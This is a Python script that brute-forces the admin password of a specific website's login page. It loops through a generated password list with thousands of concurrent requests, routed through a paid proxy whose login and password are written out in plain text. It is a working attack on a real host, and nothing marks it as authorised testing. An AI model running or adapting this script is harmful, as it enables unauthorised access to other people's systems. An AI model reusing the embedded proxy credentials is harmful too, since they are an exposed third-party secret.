import asyncio
import aiohttp
from aiohttp import ClientTimeout
import itertools
import sys

def generate_combinations():
    letters = 'abcdefghijklmnopqrstuvwxyz'
    combinations = itertools.product(letters, repeat=3)
    
    result = []
    for combo in combinations:
        # result.append(combo[0].upper() + ''.join(combo[1:]))
        result.append('Aaсb' + ''.join(combo[0:]))
    
    return result

MAX_REQUESTS_PER_SECOND = 5000

proxy = 'http://brd-customer-hl_d6d9728f-zone-datacenter_proxy1:hzzvgl8lcb64@brd.superproxy.io:22225'

async def fetch_with_retry(session, url, data, retries=100, delay=15):
    for attempt in range(retries):
        try:
            async with session.get(url, json=data, timeout=ClientTimeout(total=10), proxy = proxy) as response:
                if response.status == 200:
                    print(f"Успешный запрос с паролем: {data['password']}")
                    sys.exit(0)
                    return response
                elif response.status == 503:
                    print(f"Ошибка 503 для пароля {data['password']}. Повторная попытка через {delay} секунд.")
                    await asyncio.sleep(delay) 
                else:
                    print(f"Ошибка {response.status} для пароля {data['password']}")
                    return response
        except asyncio.TimeoutError:
            print(f"Тайм-аут для пароля {data['password']}. Повторная попытка через {delay} секунд.")
            await asyncio.sleep(delay)
    print(f"Не удалось получить ответ для пароля {data['password']} после {retries} попыток.")
    return None

async def limited_fetch(session, url, data, semaphore):
    async with semaphore:
        return await fetch_with_retry(session, url, data)

async def main():
    semaphore = asyncio.Semaphore(MAX_REQUESTS_PER_SECOND)
    async with aiohttp.ClientSession() as session:
        tasks = [
            limited_fetch(session, "http://niph12.tmweb.ru/index.php", {'login': 'admin', 'password': p}, semaphore)
            for p in generate_combinations()
        ]
        await asyncio.gather(*tasks)

asyncio.run(main())
